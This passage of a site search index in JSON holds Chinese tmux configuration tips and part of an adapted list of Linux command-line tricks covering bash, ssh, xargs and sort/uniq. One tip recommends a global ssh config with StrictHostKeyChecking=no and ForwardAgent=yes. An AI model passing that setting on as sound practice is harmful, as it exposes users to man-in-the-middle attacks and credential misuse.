\u5927\u5c0f\uff0c\u5efa\u8bae\u81ea\u5df1\u914d\u7f6e\u5feb\u6377\u952e\u3002\u6bd4\u5982\u628a\u5b83\u914d\u7f6e\u6210 Vim \u98ce\u683c\uff1a bind h select-pane -L # \u5207\u6362\u5230\u5de6\u8fb9\u7684 Pane bind j select-pane -D # \u5207\u6362\u5230\u4e0b\u8fb9\u7684 Pane bind k select-pane -U # \u5207\u6362\u5230\u4e0a\u8fb9\u7684 Pane bind l select-pane -R # \u5207\u6362\u5230\u53f3\u8fb9\u7684 Pane bind L resize-pane -L 10 # \u5411\u5de6\u6269\u5c55 bind R resize-pane -R 10 # \u5411\u53f3\u6269\u5c55 bind K resize-pane -U 5 # \u5411\u4e0a\u6269\u5c55 bind J resize-pane -D 5 # \u5411\u4e0b\u6269\u5c55 \u5b8c\u6574\u7684\u5feb\u6377\u952e\u5217\u8868\u53ef\u4ee5\u53c2\u8003\uff1a https://gist.github.com/MohamedAlaa/2961058","title":"\u5feb\u6377\u952e"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#unicode","text":"Tmux \u901a\u8fc7 LC_ALL , LC_CTYPE , LANG \u73af\u5883\u53d8\u91cf\u6765\u5224\u65ad\u662f\u5426\u7ec8\u7aef\u652f\u6301 UTF-8\u3002 \u8fd9\u6837\u7684\u5224\u65ad\u6709\u65f6\u662f\u4e0d\u51c6\u786e\u7684\uff0c\u5bfc\u81f4 Tmux \u4e2d\u65e0\u6cd5\u663e\u793a Unicode\u3002\u89e3\u51b3\u601d\u8def\u6709\u4e24\u4e2a\uff1a \u5728\u542f\u52a8 tmux \u6216 tmux attach \u6240\u5728\u7684 Shell \u4e2d\u6dfb\u52a0 LC_ALL \u73af\u5883\u53d8\u91cf\u3002 \u542f\u52a8 Tmux \u65f6\u589e\u52a0 -u \u53c2\u6570\u53ef\u4ee5\u663e\u5f0f\u5730\u901a\u77e5 tmux \u7ec8\u7aef\u652f\u6301 UTF-8\uff08 man tmux \uff09\u3002 tmux -u","title":"Unicode \u663e\u793a\u95ee\u9898"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_7","text":"Tmux \u548c Vim \u98ce\u683c\u975e\u5e38\u50cf\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u9f20\u6807\u6a21\u5f0f\u3002\u4e0b\u9762\u7684\u8bbe\u7f6e\u5f00\u542f\u4e86\u6240\u6709\u9f20\u6807\u529f\u80fd\uff1a \u70b9\u51fb\u9009\u62e9\u7a97\u683c/\u7a97\u53e3\uff0c\u62d6\u52a8\u7a97\u683c\u5927\u5c0f\uff0c\u4ee5\u53ca\u62d6\u52a8\u9f20\u6807\u590d\u5236\u6587\u5b57\u3002 set -g mouse on 2.1 \u4e4b\u524d\u7684\u7248\u672c(\u53d1\u5e03\u4e8e 2015.10.18) \u9700\u8981\u8bbe\u7f6e mode-mouse , mouse-select-pane , mouse-resize-pane , mouse-select-window \u7b494 \u4e2a\u9009\u9879\u6765\u5f00\u542f\u6240\u6709\u9f20\u6807\u529f\u80fd\uff0c\u73b0\u5728\u53ea\u9700\u8981\u8bbe\u7f6e mouse \u9009\u9879\u4e86\u3002 \u4f7f\u7528 tmux -V \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u5b89\u88c5\u7684 tmux \u7248\u672c\uff0c\u7248\u672c\u66f4\u65b0\u65e5\u5fd7\u89c1 Tmux Changelog \u3002","title":"\u542f\u7528\u9f20\u6807"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#attach","text":"\u6709\u5199\u7ae5\u978b\u4f1a\u53d1\u73b0\u5728 Tmux \u4e2d\u6267\u884c open , sudo \u7b49\u547d\u4ee4\u4f1a\u6709\u9519\u8bef\u5982\u4e0b\uff1a The window server could not be contacted. open must be run with a user logged in at the console, either as that user or as root. \u6216\u8005 Vim \u533f\u540d\u5bc4\u5b58\u5668 \u4e5f\u8bbf\u95ee\u4e0d\u5230\u7cfb\u7edf\u526a\u5207\u677f\uff0c\u6bd4\u5982\u7c98\u8d34\u65f6\u62a5\u9519\uff1a Nothing in register * \u8fd9\u662f\u56e0\u4e3a Tmux \u4e2d\u7684 Shell \u6ca1\u6709\u8fd0\u884c\u5728 Mac \u7684 GUI Session \u4e2d\uff0c \u53ef\u4ee5\u4f7f\u7528 reattach-to-user-namespace \u5de5\u5177\u6765\u8fdb\u884c Attach\u3002 \u9996\u5148\u5b89\u88c5\u8fd9\u4e00\u5de5\u5177\uff1a brew update brew install reattach-to-user-namespace \u7136\u540e\u5728 .tmux.conf \u4e2d\u914d\u7f6e\u9ed8\u8ba4\u547d\u4ee4\uff1a set -g default-command \"reattach-to-user-namespace -l /usr/local/bin/zsh\" \u8fd9\u91cc\u7684 /usr/local/bin/zsh \u8981\u5bf9\u5e94\u4e8e\u4f60\u7684\u9ed8\u8ba4 Shell \u7684\u8def\u5f84\uff0c\u5982\u679c\u4f60\u6ca1\u505a\u8fc7\u624b\u811a\u7684\u8bdd\uff0c\u5e94\u8be5\u5728 /usr/bin/bash \u3002 \u53ef\u4ee5\u901a\u8fc7 echo $SHELL \u67e5\u770b\u5f53\u524d Shell \u7684\u8def\u5f84\u3002","title":"Attach \u5230\u7528\u6237\u7a7a\u95f4"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#session","text":"Tmux \u4e2d Session \u6216 Window \u4e22\u5931\u53ef\u80fd\u7684\u539f\u56e0\u6709\u5f88\u591a\uff0c\u9700\u8981\u4ed4\u7ec6\u6392\u67e5\u3002\u68c0\u67e5 tmux \u65e5\u5fd7\uff0c\u4ee5\u53ca\u68c0\u67e5 Shell \u7684\u5404\u7ea7\u914d\u7f6e \u3002 \u6bd4\u5982 Shell \u7684 TMOUT \u73af\u5883\u53d8\u91cf\u4f1a\u8ba9\u8d85\u65f6\u540e\u7684 Shell \u81ea\u52a8\u9000\u51fa\uff0c\u6700\u7ec8\u5bfc\u81f4 Session \u5173\u95ed\u3002 \u6bd4\u5982\u4e34\u65f6\u6587\u4ef6\u5939\u88ab\u6e05\u7a7a\u5bfc\u81f4 socket \u4e22\u5931\uff0c\u53c2\u8003\uff1a https://community.webfaction.com/questions/9462/tmux-session-lost-in-unknown-pts-cause-and-possible-solution","title":"Session \u5076\u5c14\u4e22\u5931"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#shell","text":"\u6211\u4eec\u53d1\u73b0\u5f53\u6253\u5f00\u65b0\u7a97\u683c\u65f6 Shell \u4ecd\u7136\u5728Home\u76ee\u5f55\u3002 \u8fd9\u662f Tmux \u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u4e3a\u5f53\u524d Shell \u6240\u5728\u76ee\u5f55\uff1a bind '\"' split-window -c '#{pane_current_path}' bind '%' split-window -h -c '#{pane_current_path}'","title":"\u65b0 Shell \u7684\u5de5\u4f5c\u76ee\u5f55"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_8","text":"TMUX \u4e0e Screen \u7684\u533a\u522b\uff1a http://unix.stackexchange.com/questions/549/tmux-vs-gnu-screen Cheetsheet: https://gist.github.com/MohamedAlaa/2961058 Wikipedia\uff1a https://en.wikipedia.org/wiki/Tmux Vim \u63a7\u5236 Tmux\uff1a https://github.com/benmills/vimux \u539f\u6587\u94fe\u63a5\uff1a https://harttle.land/2015/11/06/tmux-startup.html","title":"\u6269\u5c55\u9605\u8bfb"},{"location":"Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/","text":"\u5e94\u8be5\u77e5\u9053\u7684Linux\u6280\u5de7 \u8fd9\u7bc7\u6587\u7ae0\u6765\u6e90\u4e8eQuroa\u7684\u4e00\u4e2a\u95ee\u7b54\u300a What are some time-saving tips that every Linux user should know? \u300b\u2014\u2014 Linux\u7528\u6237\u6709\u54ea\u4e9b\u5e94\u8be5\u77e5\u9053\u7684\u63d0\u9ad8\u6548\u7387\u7684\u6280\u5de7\u3002\u6211\u89c9\u5f97\u633a\u597d\u7684\uff0c\u603b\u7ed3\u5f97\u6bd4\u8f83\u597d\uff0c\u628a\u5176\u8f6c\u8fc7\u6765\uff0c\u5e76\u52a0\u4e86\u4e00\u4e9b\u81ea\u5df1\u7684\u7406\u89e3\u3002 \u9996\u5148\uff0c\u6211\u60f3\u544a\u8bc9\u5927\u5bb6\uff0c \u5728Unix/Linux\u4e0b\uff0c\u6700\u6709\u6548\u7387\u6280\u5de7\u7684\u4e0d\u662f\u64cd\u4f5c\u56fe\u5f62\u754c\u9762\uff0c\u800c\u662f\u547d\u4ee4\u884c\u64cd\u4f5c\uff0c\u56e0\u4e3a\u547d\u4ee4\u884c\u610f\u5473\u7740\u81ea\u52a8\u5316 \u3002\u5982\u679c\u4f60\u770b\u8fc7\u300a \u4f60\u53ef\u80fd\u4e0d\u77e5\u9053\u7684Shell \u300b\u4ee5\u53ca\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\u4f60\u5c31\u4f1a\u77e5\u9053Linux\u6709\u591a\u5f3a\u5927\uff0c\u8fd9\u4e2a\u5f3a\u5927\u5b8c\u5168\u6765\u81ea\u4e8e\u547d\u4ee4\u884c\uff0c\u4e8e\u662f\uff0c\u5c31\u7b97\u4f60\u4e0d\u77e5\u9053\u600e\u4e48\u53bb \u505a\u4e00\u4e2a\u73af\u4fdd\u4e3b\u4e49\u7684\u7a0b\u5e8f\u5458 \uff0c\u81f3\u5c11\u4ed6\u4eec\u53ef\u4ee5\u8ba9\u4f60\u5c11\u71ac\u70b9\u591c\uff0c\u4ece\u800c\u6709\u5229\u4e8e\u4f60\u7684\u8eab\u4f53\u5065\u5eb7\u548c\u6027\u751f\u6d3b\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u6709\u70b9\u957f\u7684\u5217\u8868\uff0c\u6b63\u5982\u4f5c\u8005\u6240\u8bf4\uff0c\u4f60\u5e76\u4e0d\u9700\u8981\u77e5\u9053\u6240\u6709\u7684\u8fd9\u4e9b\u4e1c\u897f\uff0c\u4f46\u662f\u5982\u679c\u4f60\u8fd8\u5728\u5f88\u6c89\u91cd\u5730\u5728\u4f7f\u7528Linux\u7684\u8bdd\uff0c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u503c\u5f97\u4f60\u770b\u4e00\u770b\u3002 \uff08\u6ce8\uff1a\u5982\u679c\u4f60\u60f3\u77e5\u9053\u4e0b\u9762\u6d89\u53ca\u5230\u7684\u547d\u4ee4\u7684\u66f4\u591a\u7684\u7528\u6cd5\uff0c\u4f60\u4e00\u5b9a\u8981man\u4e00\u70b9\u3002\u5bf9\u4e8e\u4e00\u4e9b\u547d\u4ee4\uff0c\u4f60\u53ef\u4ee5\u9700\u8981\u5148yum\u6216apt-get\u6765\u5b89\u88c5\u4e00\u4e0b\uff0c\u5982\u679c\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u522b\u5fd8\u4e86Google\u3002\u5982\u679c\u4f60\u8981Baidu\u7684\u8bdd\uff0c\u6211\u4ec5\u4ee3\u8868\u8fd9\u4e2a\u5730\u7403\u4e0a\u6240\u6709\u7684\u751f\u7269\u5305\u62ec\u5fae\u751f\u7269\u751a\u81f3\u7ec6\u83cc\u75c5\u6bd2\u548c\u5c0f\u5f3aBS\u4f60\u5230\u5b87\u5b99\u6bc1\u706d\uff09 \u57fa\u7840 \u5b66\u4e60 Bash \u3002\u4f60\u53ef\u4ee5man bash\u6765\u770b\u770bbash\u7684\u4e1c\u897f\uff0c\u5e76\u4e0d\u590d\u6742\u4e5f\u5e76\u4e0d\u957f\u3002\u4f60\u7528\u522b\u7684shell\u4e5f\u884c\uff0c\u4f46\u662fbash\u662f\u5f88\u5f3a\u5927\u7684\u5e76\u4e14\u4e5f\u662f\u7cfb\u7edf\u9ed8\u8ba4\u7684\u3002\uff08\u5b66\u4e60zsh\u6216tsch\u53ea\u4f1a\u8ba9\u4f60\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u53d7\u5230\u9650\u5236\uff09 \u5b66\u4e60 vim \u3002\u5728Linux\u4e0b\uff0c\u57fa\u672c\u6ca1\u6709\u4ec0\u4e48\u53ef\u4e0e\u4e4b\u7ade\u4e89\u7684\u7f16~~\u8bd1~~\u8f91\u5668\uff08\u5c31\u7b97\u4f60\u662f\u4e00\u4e2aEmacs\u6216Eclipse\u7684\u91cd\u5ea6\u7528\u6237\uff09\u3002\u4f60\u53ef\u4ee5\u770b\u770b\u300a \u7b80\u660evim\u653b\u7565 \u300b\u548c \u300a Vim\u7684\u5192\u9669\u6e38\u620f \u300b\u4ee5\u53ca\u300a \u7ed9\u7a0b\u5e8f\u5458\u7684Vim\u901f\u67e5\u5361 \u300b\u8fd8\u6709\u300a \u628aVim\u53d8\u6210\u4e00\u4e2a\u7f16\u7a0b\u7684IDE \u300b\u7b49\u7b49\u3002 \u4e86\u89e3 ssh \u3002\u660e\u767d\u4e0d\u9700\u8981\u53e3\u4ee4\u7684\u7528\u6237\u8ba4\u8bc1\uff08\u901a\u8fc7 ssh-agent , ssh-add \uff09\uff0c\u5b66\u4f1a\u7528ssh\u7ffb\u5899\uff0c\u7528scp\u800c\u4e0d\u662fftp\u4f20\u6587\u4ef6\uff0c\u7b49\u7b49\u3002\u4f60\u77e5\u9053\u5417\uff1fscp \u8fdc\u7aef\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u4ee5\u6309tab\u952e\u6765\u67e5\u770b\u8fdc\u7aef\u7684\u76ee\u5f55\u548c\u6587\u4ef6\uff08\u5f53\u7136\uff0c\u9700\u8981\u65e0\u53e3\u4ee4\u7684\u7528\u6237\u8ba4\u8bc1\uff09\uff0c\u8fd9\u90fd\u662fbash\u7684\u529f\u52b3\u3002 \u719f\u6089bash\u7684\u4f5c\u4e1a\u7ba1\u7406 \uff0c\u5982\uff1a &, Ctrl-Z, Ctrl-C, jobs, fg, bg, kill , \u7b49\u7b49\u3002\u5f53\u7136\uff0c\u4f60\u4e5f\u8981\u77e5\u9053 Ctrl+\\\uff08SIGQUIT\uff09 \u548c Ctrl+C \uff08SIGINT\uff09 \u7684\u533a\u522b\u3002 \u7b80\u5355\u7684\u6587\u4ef6\u7ba1\u7406 \uff1a ls \u548c ls -l (\u4f60\u6700\u597d\u77e5\u9053 \u201cls -l\u201d \u7684\u6bcf\u4e00\u5217\u7684\u610f\u601d), less, head, tail \u548c tail -f, ln \u548c ln -s (\u4f60\u77e5\u9053\u660e\u767dhard link\u548csoft link\u7684\u4e0d\u540c\u548c\u4f18\u7f3a\u70b9), chown , chmod , du (\u5982\u679c\u4f60\u60f3\u770b\u770b\u78c1\u76d8\u7684\u5927\u5c0f du -sk * ), df , mount \u3002\u5f53\u7136\uff0c\u539f\u4f5c\u8005\u5fd8\u4e86 find \u547d\u4ee4\u3002 \u57fa\u7840\u7684\u7f51\u7edc\u7ba1\u7406 \uff1a ip \u6216 ifconfig, dig\u3002\u5f53\u7136\uff0c\u539f\u4f5c\u8005\u8fd8\u5fd8\u4e86\u5982netstat, ping, traceroute, \u7b49 \u7406\u89e3\u6b63\u5219\u8868\u8fbe\u5f0f \uff0c\u8fd8\u6709grep/egrep\u7684\u5404\u79cd\u9009\u9879\u3002\u6bd4\u5982\uff1a -o, -A, \u548c -B \u8fd9\u4e9b\u9009\u9879\u662f\u5f88\u503c\u5f97\u4e86\u89e3\u7684\u3002 \u5b66\u4e60\u4f7f\u7528 apt-get \u548c yum \u6765\u67e5\u627e\u548c\u5b89\u88c5\u8f6f\u4ef6 \uff08\u524d\u8005\u7684\u7ecf\u5178\u5206\u53d1\u5305\u662fUbuntu\uff0c\u540e\u8005\u7684\u7ecf\u5178\u5206\u53d1\u5305\u662fRedhat\uff09\uff0c\u6211\u8fd8\u5efa\u8bae\u4f60\u8bd5\u7740\u4ece\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u8f6f\u4ef6\u3002 \u65e5\u5e38 \u5728 bash \u91cc\uff0c\u4f7f\u7528 Ctrl-R \u800c\u4e0d\u662f\u4e0a\u4e0b\u5149\u6807\u952e\u6765\u67e5\u627e\u5386\u53f2\u547d\u4ee4\u3002 \u5728 bash\u91cc\uff0c\u4f7f\u7528 Ctrl-W \u6765\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5355\u8bcd\uff0c\u4f7f\u7528 Ctrl-U \u6765\u5220\u9664\u4e00\u884c\u3002\u8bf7man bash\u540e\u67e5\u627eReadline Key Bindings\u4e00\u8282\u6765\u770b\u770bbash\u7684\u9ed8\u8ba4\u70ed\u952e\uff0c\u6bd4\u5982\uff1aAlt-. \u628a\u4e0a\u4e00\u6b21\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u6253\u51fa\u6765\uff0c\u800cAlt-* \u5219\u5217\u51fa\u4f60\u53ef\u4ee5\u8f93\u5165\u7684\u547d\u4ee4\u3002 \u56de\u5230\u4e0a\u4e00\u6b21\u7684\u5de5\u4f5c\u76ee\u5f55\uff1a cd \u2013 \uff08\u56de\u5230home\u662f cd ~ \uff09 \u4f7f\u7528 xargs\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u5f3a\u5927\u7684\u547d\u4ee4\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528-L\u6765\u9650\u5b9a\u6709\u591a\u5c11\u4e2a\u547d\u4ee4\uff0c\u4e5f\u53ef\u4ee5\u7528-P\u6765\u6307\u5b9a\u5e76\u884c\u7684\u8fdb\u7a0b\u6570\u3002\u5982\u679c\u4f60\u4e0d\u77e5\u9053\u4f60\u7684\u547d\u4ee4\u4f1a\u53d8\u6210\u4ec0\u4e48\u6837\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528xargs echo\u6765\u770b\u770b\u4f1a\u662f\u4ec0\u4e48\u6837\u3002\u5f53\u7136\uff0c -I{} \u4e5f\u5f88\u597d\u7528\u3002\u793a\u4f8b\uff1a find . -name \\*.py | xargs grep some_function cat hosts | xargs -I{} ssh root@{} hostname pstree -p \u53ef\u4ee5\u5e2e\u4f60\u663e\u793a\u8fdb\u7a0b\u6811\u3002\uff08\u8bfb\u8fc7\u6211\u7684\u90a3\u7bc7\u300a \u4e00\u4e2afork\u7684\u9762\u8bd5\u9898 \u300b\u7684\u4eba\u5e94\u8be5\u90fd\u4e0d\u964c\u751f\uff09 \u4f7f\u7528 pgrep \u548c pkill \u6765\u627e\u5230\u6216\u662fkill \u67d0\u4e2a\u540d\u5b57\u7684\u8fdb\u7a0b\u3002 (-f \u9009\u9879\u5f88\u6709\u7528). \u4e86\u89e3\u53ef\u4ee5\u53d1\u7ed9\u8fdb\u7a0b\u7684\u4fe1\u53f7\u3002\u4f8b\u5982\uff1a\u8981\u6302\u8d77\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u4f7f\u7528 kill -STOP [pid]. \u4f7f\u7528 man 7 signal \u6765\u67e5\u770b\u5404\u79cd\u4fe1\u53f7\uff0c\u4f7f\u7528kill -l \u6765\u67e5\u770b\u6570\u5b57\u548c\u4fe1\u53f7\u7684\u5bf9\u5e94\u8868 \u4f7f\u7528 nohup \u6216 disown \u5982\u679c\u4f60\u8981\u8ba9\u67d0\u4e2a\u8fdb\u7a0b\u8fd0\u884c\u5728\u540e\u53f0\u3002 \u4f7f\u7528netstat -lntp\u6765\u770b\u770b\u6709\u4fa6\u542c\u5728\u7f51\u7edc\u67d0\u7aef\u53e3\u7684\u8fdb\u7a0b\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 lsof\u3002 \u5728bash\u7684\u811a\u672c\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 set -x \u6765debug\u8f93\u51fa\u3002\u4f7f\u7528 set -e \u6765\u5f53\u6709\u9519\u8bef\u53d1\u751f\u7684\u65f6\u5019abort\u6267\u884c\u3002\u8003\u8651\u4f7f\u7528 set -o pipefail \u6765\u9650\u5236\u9519\u8bef\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528trap\u6765\u622a\u83b7\u4fe1\u53f7\uff08\u5982\u622a\u83b7ctrl+c\uff09\u3002 \u5728bash \u811a\u672c\u4e2d\uff0csubshells (\u5199\u5728\u5706\u62ec\u53f7\u91cc\u7684) \u662f\u4e00\u4e2a\u5f88\u65b9\u4fbf\u7684\u65b9\u5f0f\u6765\u7ec4\u5408\u4e00\u4e9b\u547d\u4ee4\u3002\u4e00\u4e2a\u5e38\u7528\u7684\u4f8b\u5b50\u662f\u4e34\u65f6\u5730\u5230\u53e6\u4e00\u4e2a\u76ee\u5f55\u4e2d\uff0c\u4f8b\u5982\uff1a # do something in current dir (cd /some/other/dir; other-command) # continue in original dir \u5728 bash \u4e2d\uff0c\u6ce8\u610f\u90a3\u91cc\u6709\u5f88\u591a\u7684\u53d8\u91cf\u5c55\u5f00\u3002\u5982\uff1a\u68c0\u67e5\u4e00\u4e2a\u53d8\u91cf\u662f\u5426\u5b58\u5728: ${name:?error message} \u3002\u5982\u679c\u4e00\u4e2abash\u7684\u811a\u672c\u9700\u8981\u4e00\u4e2a\u53c2\u6570\uff0c\u4e5f\u8bb8\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u8868\u8fbe\u5f0f input_file=${1:?usage: $0 input_file} \u3002\u4e00\u4e2a\u8ba1\u7b97\u8868\u8fbe\u5f0f\uff1a i=$(( (i + 1) % 5 )) \u3002\u4e00\u4e2a\u5e8f\u5217\uff1a {1..10}\u3002 \u622a\u65ad\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a ${var%suffix} \u548c ${var#prefix} \u3002 \u793a\u4f8b\uff1a if var=foo.pdf, then echo ${var%.pdf}.txt prints \u201cfoo.txt\u201d . \u901a\u8fc7 <(some command) \u53ef\u4ee5\u628a\u67d0\u547d\u4ee4\u5f53\u6210\u4e00\u4e2a\u6587\u4ef6\u3002\u793a\u4f8b\uff1a\u6bd4\u8f83\u4e00\u4e2a\u672c\u5730\u6587\u4ef6\u548c\u8fdc\u7a0b\u6587\u4ef6 /etc/hosts\uff1a diff /etc/hosts <(ssh somehost cat /etc/hosts) \u4e86\u89e3\u4ec0\u4e48\u53eb \u201c here documents \u201d \uff0c\u5c31\u662f\u8bf8\u5982 cat <<EOF \u8fd9\u6837\u7684\u4e1c\u897f\u3002 \u5728 bash\u4e2d\uff0c\u4f7f\u7528\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u3002\u5982\uff1a some-command >logfile 2>&1 \u3002\u53e6\u5916\uff0c\u8981\u786e\u8ba4\u67d0\u547d\u4ee4\u6ca1\u6709\u628a\u67d0\u4e2a\u6253\u5f00\u4e86\u7684\u6587\u4ef6\u53e5\u67c4\u91cd\u5b9a\u5411\u7ed9\u6807\u51c6\u8f93\u5165\uff0c\u6700\u4f73\u5b9e\u8df5\u662f\u52a0\u4e0a \u201c</dev/null\u201d \uff0c\u628a /dev/null \u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u5165\u3002 \u4f7f\u7528 man ascii \u6765\u67e5\u770b ASCII \u8868\u3002 \u5728\u8fdc\u7aef\u7684 ssh \u4f1a\u8bdd\u91cc\uff0c\u4f7f\u7528 screen \u6216 dtach \u6765\u4fdd\u5b58\u4f60\u7684\u4f1a\u8bdd\u3002\uff08\u53c2\u770b\u300a 28\u4e2aUnix/Linux\u7684\u547d\u4ee4\u884c\u795e\u5668 \u300b\uff09 \u8981\u6765debug Web\uff0c\u8bd5\u8bd5curl \u548c curl -I \u6216\u662f wget \u3002\u6211\u89c9\u5f97debug Web\u7684\u5229\u5668\u662ffirebug\uff0ccurl\u548cwget\u662f\u7528\u6765\u6293\u7f51\u9875\u7684\uff0c\u5475\u5475\u3002 \u628a HTML \u8f6c\u6210\u6587\u672c\uff1a lynx -dump -stdin \u5982\u679c\u4f60\u8981\u5904\u7406XML\uff0c\u4f7f\u7528 xmlstarlet \u5bf9\u4e8e Amazon S3\uff0c s3cmd \u662f\u4e00\u4e2a\u5f88\u65b9\u4fbf\u7684\u547d\u4ee4\uff08\u8fd8\u6709\u70b9\u4e0d\u6210\u719f\uff09 \u5728 ssh\u4e2d\uff0c\u77e5\u9053\u600e\u4e48\u6765\u4f7f\u7528ssh\u96a7\u9053\u3002\u901a\u8fc7 -L or -D (\u8fd8\u6709-R) \uff0c\u7ffb\u5899\u795e\u5668\u3002 \u4f60\u8fd8\u53ef\u4ee5\u5bf9\u4f60\u7684ssh \u505a\u70b9\u4f18\u5316\u3002\u6bd4\u5982\uff0c .ssh/config \u5305\u542b\u7740\u4e00\u4e9b\u914d\u7f6e\uff1a\u907f\u514d\u94fe\u63a5\u88ab\u4e22\u5f03\uff0c\u94fe\u63a5\u65b0\u7684host\u65f6\u4e0d\u9700\u8981\u786e\u8ba4\uff0c\u8f6c\u53d1\u8ba4\u8bc1\uff0c\u4ee5\u524d\u4f7f\u7528\u538b\u7f29\uff08\u5982\u679c\u4f60\u8981\u4f7f\u7528scp\u4f20\u6587\u4ef6\uff09\uff1a TCPKeepAlive=yes ServerAliveInterval=15 ServerAliveCountMax=6 StrictHostKeyChecking=no Compression=yes ForwardAgent=yes \u5982\u679c\u4f60\u6709\u8f93\u4e86\u4e2a\u547d\u4ee4\u884c\uff0c\u4f46\u662f\u4f60\u6539\u53d8\u6ce8\u610f\u4e86\uff0c\u4f46\u4f60\u53c8\u4e0d\u60f3\u5220\u9664\u5b83\uff0c\u56e0\u4e3a\u4f60\u8981\u5728\u5386\u53f2\u547d\u4ee4\u4e2d\u627e\u5230\u5b83\uff0c\u4f46\u4f60\u4e5f\u4e0d\u60f3\u6267\u884c\u5b83\u3002\u90a3\u4e48\uff0c\u4f60\u53ef\u4ee5\u6309\u4e0b Alt-# \uff0c\u4e8e\u662f\u8fd9\u4e2a\u547d\u4ee4\u5173\u5c31\u88ab\u52a0\u4e86\u4e00\u4e2a#\u5b57\u7b26\uff0c\u4e8e\u662f\u5c31\u88ab\u6ce8\u91ca\u6389\u4e86\u3002 \u6570\u636e\u5904\u7406 \u4e86\u89e3 sort \u548c uniq \u547d\u4ee4 (\u5305\u62ec uniq \u7684 -u \u548c -d \u9009\u9879). \u4e86\u89e3\u7528 cut, paste, \u548c join \u547d\u4ee4\u6765\u64cd\u4f5c\u6587\u672c\u6587\u4ef6\u3002\u5f88\u591a\u4eba\u5fd8\u4e86\u5728cut\u524d\u4f7f\u7528join\u3002 \u5982\u679c\u4f60\u77e5\u9053\u600e\u4e48\u7528sort/uniq\u6765\u505a\u96c6\u5408\u4ea4\u96c6\u3001\u5e76\u96c6\u3001\u5dee\u96c6\u80fd\u5f88\u5927\u5730\u4fc3\u8fdb\u4f60\u7684\u5de5\u4f5c\u6548\u7387\u3002\u5047\u8bbe\u6709\u4e24\u4e2a\u6587\u672c\u6587\u4ef6a\u548cb\u5df2\u89e3\u88ab uniq\u4e86\uff0c\u90a3\u4e48\uff0c\u7528sort/uniq\u4f1a\u662f\u6700\u5feb\u7684\u65b9\u5f0f\uff0c\u65e0\u8bba\u8fd9\u4e24\u4e2a\u6587\u4ef6\u6709\u591a\u5927\uff08sort\u4e0d\u4f1a\u88ab\u5185\u5b58\u6240\u9650\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528-T\u9009\u9879\uff0c\u5982\u679c\u4f60\u7684/tmp\u76ee\u5f55\u5f88\u5c0f\uff09 cat a b | sort | uniq > c # c is a union b \u5e76\u96c6 cat a b | sort | uniq -d > c # c is a intersect b \u4ea4\u96c6 cat a b b | sort | uniq -u > c # c is set difference a - b \u5dee\u96c6 \u4e86\u89e3\u548c\u5b57\u7b26\u96c6\u76f8\u5173\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5305\u62ec\u6392\u5e8f\u548c\u6027\u80fd\u3002\u5f88\u591a\u7684Linux\u5b89\u88c5\u7a0b\u5e8f\u90fd\u4f1a\u8bbe\u7f6eLANG 